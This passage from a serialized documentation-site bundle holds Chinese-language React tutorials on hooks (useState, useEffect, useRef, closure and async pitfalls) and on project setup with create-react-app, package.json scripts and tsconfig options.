常见钩子和使用规则\n\nreact hook中常用的钩子：usestate()、useeffect()、usecontext()、usereducer()。当然也可以自定义hook，但要遵循钩子的命名规范前缀是use，例如usexxx()。更多钩子介绍可以看后面章节或者查看官方文档hook api 索引。\n\nreact hook是js函数，使用它会有两个额外的规则：\n\n * 只能在函数最外层调用hook。不要在循环、条件判断或者子函数中调用。\n * 只能在react的函数式组件中调用hook（自定义hook中也可以调用hook）。不要在其他js函数中调用。\n\n\n# usestate状态钩子\n\n\n# 如何使用usestate\n\n在类组件中使用state，是在constructor函数中对this.state={xxx: xxx}进行初始化，在组件其他地方this.state.xxx使用这个state变量的值，还可以通过this.setstate()修改它的值。而在函数式组件中没有this，使用state的话需要用usestate()钩子将state功能勾入到这个函数组件里，形式是const [something, setsomething] = usestate(param)（变量名自己取，第二个参数是一个方法，最好是setxxx的形式）。\n\nimport react, { usestate } from 'react';\n\nfunction example() {\n  // 相当于class组件里的this.state = { count: 0 };\n  const [count, setcount] = usestate(0);\n  // 其实example可能会被多次调用（父组件更新等），那这段段代码会多次执行，不用担心多次声明初始化count，react内部做了优化处理\n\n  return (\n    <div>\n      <p>you clicked {count} times</p>\n      <button onclick={() => setcount(count + 1)}>\n        click me\n      </button>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nconst [count, setcount] = usestate(0);使用了usestate钩子声明了一个state变量（该变量实际在react内部），usestate()会返回一个数组，数组的第一个值就是这个state变量的值（临时给你用），数组的第二个值是修改该state变量的函数，usestate()的唯一入参是这个state变量最初的值。在后续的使用过程中，直接用count就可以了，比类组件的this.state.count方便多了。\n\n注意声明接收变量时要使用const，不要使用let也别用count=8来修改count（局部覆盖没什么意义），要使用setcount修改实际的count，还能触发重新渲染（类似于类组件的this.setstate()）。\n\n\n# 要合并多个state变量吗\n\n你可能想在一次usestate()调用中传入一个包含了所有state的对象（合并多个state变量），可以是可以的，例如\n\n// 类组件的state\nthis.state = { left: 0, top: 0, width: 100, height: 100 };\n// 函数式组件的state\nconst [state, setstate] = usestate({ left: 0, top: 0, width: 100, height: 100 });\n\n\n1\n2\n3\n4\n\n\n但是我们仍然建议不对多个state变量进行合并，因为拆分后的state变量可以在某些情况下单独抽取到一个函数方法中。当然你也可以合并一部分独立拆分另一部分，可能会比较混乱。如果state的逻辑开始变得复杂，可以用reducer来管理它，或使用自定义hook。\n\nfunction box() {\n  // 拆分state变量，抽取到一个函数方法中\n  const position = usewindowposition();\n  const [size, setsize] = usestate({ width: 100, height: 100 });\n  // ...\n}\n\nfunction usewindowposition() {\n  const [position, setposition] = usestate({ left: 0, top: 0 });\n  useeffect(() => {\n    // ...\n  }, []);\n  return position;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# useeffect副作用钩子\n\n\n# 纯函数与副作用\n\n纯函数的特征：\n\n    1)该函数不会对入参本身进行修改，必须得有return返回值；在相同的入参时，需产生相同的返回值。\n    2)该函数得没有副作用；返回值可以与入参无关（有关也可以），但是不能与入参以外的变量或者其他影响有关（也是在说不能有副作用）。\n\n其中副作用指的是函数除了返回函数值，还对函数产生了附加的影响（与外界有关了，结果不一定可控），例如修改了全局变量（函数外的）、使用了ajax、修改了dom元素、console输出等。\n\nlet a = 0, b = 1, c = 2;\n\nfunction handle(p1, p2) {\n    a ++; // 这行是副作用，去掉这行那这个函数就是纯函数\n    return p1 + p2; // 纯函数必须有return\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 如何使用useeffect\n\nuseeffect钩子可以让开发者在函数式组件中执行副作用操作，其形式是useeffect(() => {}, [xxx])，第一个参数是副作用处理函数，第二个参数是组件的依赖列表（数组形式）。useeffect钩子默认情况在每次渲染后执行，包括挂载时的第一次渲染。\n\nimport react, { usestate, useeffect } from 'react';\n\nfunction example() {\n  const [count, setcount] = usestate(0);\n\n  // useeffect钩子\n  useeffect(() => {\n    document.title = `you clicked ${count} times`;\n  }, [count]); // 第二个参数是[count]这样的一个数组\n\n  return (\n    <div>\n      <p>you clicked {count} times</p>\n      <button onclick={() => setcount(count + 1)}>\n        click me\n      </button>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 第二个参数不传时（默认情况），在挂载和每次更新后执行（相当于componentdidmount和componentdidupdate）；\n * 第二个参数为[xxx]时，在挂载和每次更新后并且判断了特定状态之后考虑是否跳过执行，例如下面这个例子；有点像vue中的watch。\n * 第二个参数为[]空数组时，只在挂载后执行（相当于只componentdidmount，即跳过了componentdidupdate），因为每次更新后由于依赖列表为空认为状态没有改变就跳过了每次更新后执行effect这个步骤。\n\ncomponentdidupdate(prevprops, prevstate) {\n  if (prevstate.count !== this.state.count) { // 对于特定状态的判断，解决性能问题\n    document.title = `you clicked ${this.state.count} times`;\n  }\n}\n// 用useeffect改写上面的，只是使用useeffect钩子更方便更精准。\nuseeffect(() => {\n  document.title = `you clicked ${count} times`;\n}, [count]);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nps：useeffect钩子实际上与componentdidmount或componentdidupdate有些地方不一样，调度effect时不会阻塞浏览器更新屏幕，这让你的应用看起来响应更快。\n\n在开发class组件时，经常在componentdidmount中添加订阅，在componentwillunmount中删除订阅，代码比较分散。使用useeffect钩子的清除机制可以解决这个问题，在useeffect最后return一个清除函数即可，会在组件卸载的时候执行清除操作。\n\n// 模拟componentdidmount\nuseeffect(() => {\n  const timer = setinterval(() => {\n    // ...\n  }, 1000)\n  // 模拟componentwillunmount\n  return function cleanup() {\n    clearinterval(timer);\n  };\n}, []);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n其实useeffect中return的清除函数，不是只在卸载组件的时候执行一次，而是在执行新的effect的时候会清除上一个effect（并调用上一个effect的return的清除函数），这是hook设计的一个默认行为，是为了简化id变化时要先删除原先的订阅再去添加新订阅来更新展示信息这样一个麻烦的步骤，例如下面这个例子。\n\ncomponentdidmount() {\n  chatapi.subscribetofriendstatus(\n    this.props.friend.id,\n    this.handlestatuschange\n  );\n}\ncomponentdidupdate(prevprops) {\n  // 取消订阅之前的 friend.id\n  chatapi.unsubscribefromfriendstatus(\n    prevprops.friend.id,\n    this.handlestatuschange\n  );\n  // 订阅新的 friend.id\n  chatapi.subscribetofriendstatus(\n    this.props.friend.id,\n    this.handlestatuschange\n  );\n}\ncomponentwillunmount() {\n  chatapi.unsubscribefromfriendstatus(\n    this.props.friend.id,\n    this.handlestatuschange\n  );\n}\n// 用useeffect改写上面的，执行新effect时会先运行上一个effect的return的清除函数\nuseeffect(() => {\n  chatapi.subscribetofriendstatus(props.friend.id, handlestatuschange);\n  // 返回一个清除函数。它会在上一次的effect执行完就会调用\n  return function cleanup() {\n    chatapi.unsubscribefromfriendstatus(props.friend.id, handlestatuschange);\n  };\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n最后就是使用多个useeffect的场景，主要就是为了分割无关的代码，将相同用途的代码放在同一个effect中。\n\nfunction friendstatuswithcounter(props) {\n  const [count, setcount] = usestate(0);\n  useeffect(() => {\n    document.title = `you clicked ${count} times`;\n  });\n\n  const [isonline, setisonline] = usestate(null);\n  useeffect(() => {\n    function handlestatuschange(status) {\n      setisonline(status.isonline);\n    }\n\n    chatapi.subscribetofriendstatus(props.friend.id, handlestatuschange);\n    return () => {\n      chatapi.unsubscribefromfriendstatus(props.friend.id, handlestatuschange);\n    };\n  });\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# useeffect注意事项\n\n# 避免不必要的effect\n\n副作用处理函数内部如果有props或state的相关变量，基本上都会在依赖列表中添加这些相关变量。除非业务需求就是只在挂载时运行一次，即使父组件传来的props或者本组件的state改变了也不影响，这样倒是可以让依赖列表为空数组。像上一小节中的props.friend.id变了，最好是在第二个参数中加上[props.friend.id]。\n\n// 类组件中用prevstate.count和this.state.count进行判断，避免不必要的逻辑\ncomponentdidupdate(prevprops, prevstate) {\n  if (prevstate.count !== this.state.count) {\n    document.title = `you clicked ${this.state.count} times`;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n// 函数组件中useeffect，要在第二个参数加上依赖数据，比如下面的props.friend.id\nuseeffect(() => {\n  function handlestatuschange(status) {\n    setisonline(status.isonline);\n  }\n\n  chatapi.subscribetofriendstatus(props.friend.id, handlestatuschange);\n  return () => {\n    chatapi.unsubscribefromfriendstatus(props.friend.id, handlestatuschange);\n  };\n}, [props.friend.id]); // 仅在 props.friend.id 发生变化时，重新订阅\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# 注意闭包问题\n\n副作用处理函数是个闭包，这意味着这个闭包会记住副作用处理函数在被创建时所处的环境。像上面这个例子，当props.friend.id变化时，触发本组件重新渲染，执行新的effect，执行前会调用旧effect的清除函数并且清除旧effect的闭包形式，然后继续执行这个新的effect。\n\n如果effect中有频繁变化的值，例如在effect里使用setinterval并在其内部执行setstate，这种定时器需求一般都是写在componentdidmount中（如果写在componentdidmount中，每次都创建一个新定时器也是不大对的，还容易形成死循环），那么使用useeffect时其依赖列表得是个空数组，就算每隔一段时间调用setstate触发重新渲染，但由于useeffect的依赖列表为空数组就会跳过每次更新后的新effect调用。\n\nfunction counter() {\n  const [count, setcount] = usestate(0);\n\n  useeffect(() => {\n    // 我们只想让定时器生成一次，不让它在页面更新后再重新创建，那么第二个参数必须是[]空数组\n    const id = setinterval(() => {\n      // 但我们又依赖了state中的count，它还是闭包\n      setcount(count + 1);\n    }, 1000);\n    return () => clearinterval(id);\n  }, []); // 只在挂载后执行\n\n  return <h1>{count}</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n上面这个写法逻辑上没啥问题，但是由于闭包的原因，setcount(count + 1)中的count其实一直是0（当时setinterval内的这个函数创建时count就是0），那就需要使用setstate的函数入参式写法（setstate的第一个形参是个函数，这个函数里的形参可以拿到以前的count）。\n\nfunction counter() {\n  const [count, setcount] = usestate(0);\n\n  useeffect(() => {\n    const id = setinterval(() => {\n      setcount(c => c + 1); // 在这不依赖于外部的 `count` 变量\n    }, 1000);\n    return () => clearinterval(id);\n  }, []); // 我们的 effect 不使用组件作用域中的任何变量\n\n  return <h1>{count}</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 注意async问题\n\nuseeffect中处理异步操作时，一般就用promise常用的then处理法；如果要使用async/await，不能直接在处理函数头上加async标识，得新建一个函数加上async标识，最后在处理函数中调用这个新函数。\n\nfunction productpage({ productid }) {\n  const [product, setproduct] = usestate(null);\n\n  useeffect(() => {// 不能在这里加async\n    // 把这个函数移动到 effect 内部后，我们可以清楚地看到它用到的值productid。\n    async function fetchproduct() {\n      const response = await fetch('http://myapi/product/' + productid);\n      const json = await response.json();\n      setproduct(json);\n    }\n    // 调用这个fetchproduct函数\n    fetchproduct();\n  }, [productid]);\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这个新函数是可以定义在effect外部甚至是组件的外部，如果没有依赖的props和state是比较容易挪到外面的，但是如果有依赖还要放在外部，那可以使用usecallback来包裹这个新函数以避免随渲染发生改变，在effect的依赖列表中添加这个新函数的引用。\n\nfunction productpage({ productid }) {\n  const fetchproduct = usecallback(() => {\n    // ... does something with productid ...\n  }, [productid]);\n\n  return <productdetails fetchproduct={fetchproduct} />;\n}\n\nfunction productdetails({ fetchproduct }) {\n  useeffect(() => {\n    fetchproduct();\n  }, [fetchproduct]);\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# useref钩子\n\n在类组件中会用到react.createref()创建ref，用这个创建出来的ref给组件打上标记，再用它来操作组件的dom或者获取控件的value等。\n\n在函数组件中使用useref钩子也可以创建一个ref给组件打标记从而获取组件的dom以及一些属性，例子如下：\n\nfunction textinputwithfocusbutton() {\n  const inputel = useref(null);\n  const onbuttonclick = () => {\n    // `current` 指向已挂载到 dom 上的input元素\n    inputel.current.focus();\n  };\n  return (\n    <>\n      <input ref={inputel} type=\"text\" />\n      <button onclick={onbuttonclick}>focus the input</button>\n    </>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nuseref和react.createref()的区别：react.createref()一般用于类组件，用于函数组件的话，一般就只能用在函数外部，原因是用在内部每次渲染都会重新生成一个新引用（每次重新渲染，函数组件都会运行一次）；useref一般用于函数组件内部，即使每次重新渲染，它都是相同的引用，这样的话它可以模拟类组件中的this。\n\n下面这个例子就是useref钩子和useeffect钩子结合使用场景，useeffect的闭包场景可能是想拿props，正常拿因为闭包的原因可能拿的值一直没有变化。那么可以用useref钩子来保存props（模拟this.props），或许还要创建一个useeffect用来更新保存的最新值。当然，下面这种在定时器每隔一段时间读最新props场景不太多见。\n\nfunction example(props) {\n  // 把最新的 props 保存在一个 ref 中。useref钩子相当于react.createref()\n  const latestprops = useref(props);\n  useeffect(() => {\n    latestprops.current = props;\n  });\n\n  useeffect(() => {\n    function tick() {\n      // 在任何时候读取最新的 props\n      console.log(latestprops.current);\n    }\n\n    const id = setinterval(tick, 1000);\n    return () => clearinterval(id);\n  }, []); // 这个 effect 从不会重新执行\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n要尽可能少的使用react.createref()和useref钩子。\n\n\n# usecontext钩子",charsets:{cjk:!0}},{title:"学习react的准备工作",frontmatter:{},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/",relativePath:"book-web/web前端js框架/学习React/README.md",key:"v-4e99b6d2",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:19},{level:2,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:485},{level:2,title:"简单了解一下项目结构",slug:"简单了解一下项目结构",normalizedTitle:"简单了解一下项目结构",charIndex:2049},{level:2,title:"简单了解一下ts编译相关",slug:"简单了解一下ts编译相关",normalizedTitle:"简单了解一下ts编译相关",charIndex:4045}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"介绍 环境准备 简单了解一下项目结构 简单了解一下ts编译相关",content:'# 学习react的准备工作\n\n\n# 介绍\n\nReact由来：\n\n 1. 起初由Facebook的软件工程师Jordan Walke创建。\n 2. 于2011年部署于Facebook的newsfeed。\n 3. 随后在2012年部署于Instagram。\n 4. 2013年5月宣布开源\n\nReact是一款将数据渲染成HTML页面的JavaScript开源库。它使用函数式编程进行组件化式的开发，组件间遵循单向数据流。\n\n组件化：将页面分割成许多独立的组件（可自由组合），这些组件有自己的功能逻辑，组件也可以复用在很多地方，以达到功能相同风格一致的目的。组件是独立的但彼此之间还是存在一定的关联，可以通过数据流来达到联动的目的。\n\n单向数据流：两种理解，一是组件间的数据只能是上层流动到下层，如要传递回上层得另外通过回调函数等方式；二是数据存储与UI之间只能是数据决定UI展示，如要让UI的变化影响数据的话得另外使用setState等方式。\n\n函数式编程：因为组件自由组合的缘故，基本用不到组件继承，组件间组合的代码书写还有复用这与函数式编程的方式没什么区别。\n\n\n# 环境准备\n\n 1. 保证本地有node.js还有git。\n\n 2. 使用的编辑器是vscode，打包工具是webpack。\n\n 3. 使用的语言是js（还有jsx），当然也可以用typescript。\n\n 4. 脚手架工具是create-react-app。\n    \n    * 可以先卸载老旧的create-react-app，npm uninstall create-react-app -g；\n    * 然后全局安装create-react-app，npm install create-react-app -g；\n    * 在一个空目录或者你的前端workspace下运行运行npx create-react-app my-app，其中my-app是项目名。如果是ts项目，就输入npx create-react-app my-app --template typescript\n    * 4.0.0版本的create-react-app脚手架有些问题，需要修改node_modules里的webpack配置，具体去react相关问题里查看。\n\n 5. 删除暂时不需要的文件（按自己的需要留）：\n    \n    * 删除入口文件index.tsx中的reportWebVitals（性能分析）和index.css的使用，对应删除reportWebVitals.ts文件和index.css文件；\n    * 清空App.tsx中的所有内容，删除logo.svg文件和App.css文件；\n    * 删除测试相关的文件setupTests.ts和App.test.tsx（自动化测试）。\n\n 6. 如果你不想用脚手架，可以用<script>方式引进来\n    \n    \x3c!-- react核心库。https://react.docschina.org/docs/add-react-to-a-website.html --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    \x3c!-- react操作dom的库 --\x3e\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n    \x3c!-- 编译jsx、es5以上的语法。https://www.babeljs.cn/setup#installation --\x3e\n    <script src="https://unpkg.com/@babel/standalone/babel.min.js" crossorigin><\/script>\n    \x3c!-- 如果要使用jsx那就要将text/javascript换成text/babel --\x3e\n    <script type="text/babel">\n        // 你的jsx代码\n    <\/script>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 7. 安装React开发调试工具，打开chrome网上应用店，在搜索栏里搜索“React.js devtools”，确认一下提供方是Facebook，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n\n 8. 推荐VSCode中的“ES7 React/Redux/React-Native/JS snippets”插件\n\n\n# 简单了解一下项目结构\n\n 1. 项目常见目录和文件：\n    \n    * node_modules存储的是项目需要的npm局部包，通过npm install下载的局部包都在这个文件夹下。\n    * public存储的是项目的静态资源文件。\n    * src存储的是项目的源代码。\n    * 如果经过npm run bulid命令打包项目后会生成一个bulid文件夹，存储着浏览器可执行的代码（es5等）。\n    * 如果经过npm run eject命令进行配置文件弹出的话会生成config文件夹。\n    * package.json和package-lock.json是npm包的清单和配置信息。\n    * tsconfig.json是ts编译配置文件。\n\n 2. 根节点：\n    \n    * public/index.html中的<div id="root"></div>就是根节点，react元素会被动态挂载到这个div根节点上。\n    * js的入口就是src/index.tsx，其中有个ReactDOM.render(<App />, document.getElementById(\'root\'))，这就是连接html和js的根节点代码。\n    \n    <!DOCTYPE html>\n    <html lang="en">\n    <head>\n        <meta charset="utf-8" />\n        <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />\n        \x3c!-- 用于开启理想视口，用于做移动端网页适配 --\x3e\n        <meta name="viewport" content="width=device-width, initial-scale=1" />\n        \x3c!-- 用于配置浏览器页签+地址栏的颜色（仅支持安卓手机浏览器） --\x3e\n        <meta name="theme-color" content="#000000" />\n        <meta name="description" content="learn-react" />\n        \x3c!-- 用于指定网页添加到手机主屏幕后的图标（苹果系统） --\x3e\n        <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />\n        \x3c!-- 应用加壳（web变手机应用）的配置文件 --\x3e\n        <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />\n        <title>React App</title>\n    </head>\n    <body>\n        <noscript>You need to enable JavaScript to run this app.</noscript>\n        \x3c!-- 根容器 --\x3e\n        <div id="root"></div>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    \n\n 3. package.json文件：\n    \n    * dependencies依赖中有两个比较重要的源文件模块react和react-dom，这是react的核心所在。然后还有一个react-scripts，可以把它理解成一个傻瓜版的webpack，负责编译打包加载文件等功能。\n    * scripts下有四个命令：\n      * start是启动一个本地服务器，将项目在这个本地服务器上进行托管，在浏览器上打开对应的地址就可以浏览react项目的网页了。\n      * build用于编译打包项目的，因为项目目前都是使用es6或者ts语法的，需要经过编译生成es5代码让浏览器使用。\n      * test用于做单元测试等测试程序的。\n      * eject帮助我们弹出项目的配置文件（前提先提交到git），但是会对项目造成不可逆的结构性改变，不是特殊需求还是不要进行这一步。\n\n 4. 周边库：nanoid生成唯一id，使用npm i nanoid进行局部安装；\n\n\n# 简单了解一下ts编译相关\n\n 1. tsconfig.json中compilerOptions的常见项：\n    * noImplicitAny：在表达式和声明上有隐含的any类型时报错。如果需要进行ts和js的混合编写的话，这个值可以设置为false，去掉报错信息。\n    * target：编译后的目标文件的es版本，一般是es5（主流浏览器），如果是react-native可以使用es6。\n    * lib：编译期间所需要的库文件，为了告诉编译器可以使用哪些功能。例如document.getElementById(\'root\')就需要使用dom这个库。\n    * allowJs：允许混合编译js文件，一般设置为true。\n    * esModuleInterop：允许我们使用CommonJS的方式来导入导出文件，一般设置为true。不开启的话得使用import * as React from \'react\'这种比较麻烦的写法。\n    * module：配置我们的代码使用哪个模块系统。有node.js的CommonJS系统，es6标准的esnext或es6系统，requirejs的AMD系统。常使用esnext，使用CommonJS也是可以的。\n    * moduleResolution：决定我们编译器的工作方式，也决定各个文件调用、import的工作流程。一般是node，还有一个值classic在19年被废弃了。\n    * isolatedModules：编译器会将每个文件作为单独的模块来使用，一般设置为true。\n    * noEmit：当发生编译错误时，编译器不会生成对应的js代码，一般设置为true。\n    * jsx：允许编译器支持编译react代码，设置的值为react，表示生成js。另外还可以取值preserve是保留jsx形式，取值react-native内容还是jsx形式但拓展名是js了；还有两个react-jsx和react-jsxdev是新的转换，可以看介绍全新的 JSX 转换。\n 2. tsconfig.json中的其他项：\n    * include：需要编译的文件，使用文件的相对路径或绝对路径。**表示任意子目录，*表示任意文件名，?表示可忽略的。\n    * exclude：将会从编译中排除的文件，使用方法和include一样，经常用于排除include里不需要的文件，也还会排除node_modules、测试文件和编译输出目录。如果省略此选项，将会使用outDir作为指定目录\n    * files：始终会被编译的文件，不会受到exclude的影响。\n 3. ts编译器的读取tsconfig.json：\n    * 在node_modules\\react-scripts\\config\\webpack.config.js文件里有一行代码const useTypeScript = fs.existsSync(paths.appTsConfig);，其中这个appTsConfig指向了项目根目录下的tsconfig.json。\n    * 仍然是那个文件，在里面搜索require.resolve(\'babel-loader\')，这个就是项目的编译器，会把/\\.(js|mjs|jsx|ts|tsx)$/这些文件编译成es5代码，编译时通过tsconfig.json再具体去做编译工作。',normalizedContent:'# 学习react的准备工作\n\n\n# 介绍\n\nreact由来：\n\n 1. 起初由facebook的软件工程师jordan walke创建。\n 2. 于2011年部署于facebook的newsfeed。\n 3. 随后在2012年部署于instagram。\n 4. 2013年5月宣布开源\n\nreact是一款将数据渲染成html页面的javascript开源库。它使用函数式编程进行组件化式的开发，组件间遵循单向数据流。\n\n组件化：将页面分割成许多独立的组件（可自由组合），这些组件有自己的功能逻辑，组件也可以复用在很多地方，以达到功能相同风格一致的目的。组件是独立的但彼此之间还是存在一定的关联，可以通过数据流来达到联动的目的。\n\n单向数据流：两种理解，一是组件间的数据只能是上层流动到下层，如要传递回上层得另外通过回调函数等方式；二是数据存储与ui之间只能是数据决定ui展示，如要让ui的变化影响数据的话得另外使用setstate等方式。\n\n函数式编程：因为组件自由组合的缘故，基本用不到组件继承，组件间组合的代码书写还有复用这与函数式编程的方式没什么区别。\n\n\n# 环境准备\n\n 1. 保证本地有node.js还有git。\n\n 2. 使用的编辑器是vscode，打包工具是webpack。\n\n 3. 使用的语言是js（还有jsx），当然也可以用typescript。\n\n 4. 脚手架工具是create-react-app。\n    \n    * 可以先卸载老旧的create-react-app，npm uninstall create-react-app -g；\n    * 然后全局安装create-react-app，npm install create-react-app -g；\n    * 在一个空目录或者你的前端workspace下运行运行npx create-react-app my-app，其中my-app是项目名。如果是ts项目，就输入npx create-react-app my-app --template typescript\n    * 4.0.0版本的create-react-app脚手架有些问题，需要修改node_modules里的webpack配置，具体去react相关问题里查看。\n\n 5. 删除暂时不需要的文件（按自己的需要留）：\n    \n    * 删除入口文件index.tsx中的reportwebvitals（性能分析）和index.css的使用，对应删除reportwebvitals.ts文件和index.css文件；\n    * 清空app.tsx中的所有内容，删除logo.svg文件和app.css文件；\n    * 删除测试相关的文件setuptests.ts和app.test.tsx（自动化测试）。\n\n 6. 如果你不想用脚手架，可以用<script>方式引进来\n    \n    \x3c!-- react核心库。https://react.docschina.org/docs/add-react-to-a-website.html --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    \x3c!-- react操作dom的库 --\x3e\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n    \x3c!-- 编译jsx、es5以上的语法。https://www.babeljs.cn/setup#installation --\x3e\n    <script src="https://unpkg.com/@babel/standalone/babel.min.js" crossorigin><\/script>\n    \x3c!-- 如果要使用jsx那就要将text/javascript换成text/babel --\x3e\n    <script type="text/babel">\n        // 你的jsx代码\n    <\/script>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 7. 安装react开发调试工具，打开chrome网上应用店，在搜索栏里搜索“react.js devtools”，确认一下提供方是facebook，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n\n 8. 推荐vscode中的“es7 react/redux/react-native/js snippets”插件\n\n\n# 简单了解一下项目结构\n\n 1. 项目常见目录和文件：\n    \n    * node_modules存储的是项目需要的npm局部包，通过npm install下载的局部包都在这个文件夹下。\n    * public存储的是项目的静态资源文件。\n    * src存储的是项目的源代码。\n    * 如果经过npm run bulid命令打包项目后会生成一个bulid文件夹，存储着浏览器可执行的代码（es5等）。\n    * 如果经过npm run eject命令进行配置文件弹出的话会生成config文件夹。\n    * package.json和package-lock.json是npm包的清单和配置信息。\n    * tsconfig.json是ts编译配置文件。\n\n 2. 根节点：\n    \n    * public/index.html中的<div id="root"></div>就是根节点，react元素会被动态挂载到这个div根节点上。\n    * js的入口就是src/index.tsx，其中有个reactdom.render(<app />, document.getelementbyid(\'root\'))，这就是连接html和js的根节点代码。\n    \n    <!doctype html>\n    <html lang="en">\n    <head>\n        <meta charset="utf-8" />\n        <link rel="icon" href="%public_url%/favicon.ico" />\n        \x3c!-- 用于开启理想视口，用于做移动端网页适配 --\x3e\n        <meta name="viewport" content="width=device-width, initial-scale=1" />\n        \x3c!-- 用于配置浏览器页签+地址栏的颜色（仅支持安卓手机浏览器） --\x3e\n        <meta name="theme-color" content="#000000" />\n        <meta name="description" content="learn-react" />\n        \x3c!-- 用于指定网页添加到手机主屏幕后的图标（苹果系统） --\x3e\n        <link rel="apple-touch-icon" href="%public_url%/logo192.png" />\n        \x3c!-- 应用加壳（web变手机应用）的配置文件 --\x3e\n        <link rel="manifest" href="%public_url%/manifest.json" />\n        <title>react app</title>\n    </head>\n    <body>\n        <noscript>you need to enable javascript to run this app.</noscript>\n        \x3c!-- 根容器 --\x3e\n        <div id="root"></div>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    \n\n 3. package.json文件：\n    \n    * dependencies依赖中有两个比较重要的源文件模块react和react-dom，这是react的核心所在。然后还有一个react-scripts，可以把它理解成一个傻瓜版的webpack，负责编译打包加载文件等功能。\n    * scripts下有四个命令：\n      * start是启动一个本地服务器，将项目在这个本地服务器上进行托管，在浏览器上打开对应的地址就可以浏览react项目的网页了。\n      * build用于编译打包项目的，因为项目目前都是使用es6或者ts语法的，需要经过编译生成es5代码让浏览器使用。\n      * test用于做单元测试等测试程序的。\n      * eject帮助我们弹出项目的配置文件（前提先提交到git），但是会对项目造成不可逆的结构性改变，不是特殊需求还是不要进行这一步。\n\n 4. 周边库：nanoid生成唯一id，使用npm i nanoid进行局部安装；\n\n\n# 简单了解一下ts编译相关\n\n 1. tsconfig.json中compileroptions的常见项：\n    * noimplicitany：在表达式和声明上有隐含的any类型时报错。如果需要进行ts和js的混合编写的话，这个值可以设置为false，去掉报错信息。\n    * target：编译后的目标文件的es版本，一般是es5（主流浏览器），如果是react-native可以使用es6。\n    * lib：编译期间所需要的库文件，为了告诉编译器可以使用哪些功能。例如document.getelementbyid(\'root\')就需要使用dom这个库。\n    * allowjs：允许混合编译js文件，一般设置为true。\n    * esmoduleinterop：允许我们使用commonjs的方式来导入导出文件，一般设置为true。不开启的话得使用import * as react from \'react\'这种比较麻烦的写法。\n    * module：配置我们的代码使用哪个模块系统。有node.js的commonjs系统，es6标准的esnext或es6系统，requirejs的amd系统。常使用esnext，使用commonjs也是可以的。\n    * moduleresolution：决定我们编译器的工作方式，也决定各个文件调用、import的工作流程。一般是node，还有一个值classic在19年被废弃了。\n    * isolatedmodules：编译器会将每个文件作为单独的模块来使用，一般设置为true。\n    * noemit：当发生编译错误时，编译器不会生成对应的js代码，一般设置为true。\n    * jsx：允许编译器支持编译react代码，设置的值为react，表示生成js。另外还可以取值preserve是保留jsx形式，取值react-native内容还是jsx形式但拓展名是js了；还有两个react-jsx和react-jsxdev是新的转换，可以看介绍全新的 jsx 转换。\n 2. tsconfig.json中的其他项：\n    * include：需要编译的文件，使用文件的相对路径或绝对路径。**表示任意子目录，*表示任意文件名，?表示可忽略的。\n    * exclude：将会从编译中排除的文件，使用方法和include一样，经常用于排除include里不需要的文件，也还会排除node_modules、测试文件和编译输出目录。如果省略此选项，将会使用outdir作为指定目录\n    * files：始终会被编译的文件，不会受到exclude的影响。\n 3. ts编译器的读取tsconfig.json：\n    * 在node_modules\\react-scripts\\config\\webpack.config.js文件里有一行代码const usetypescript = 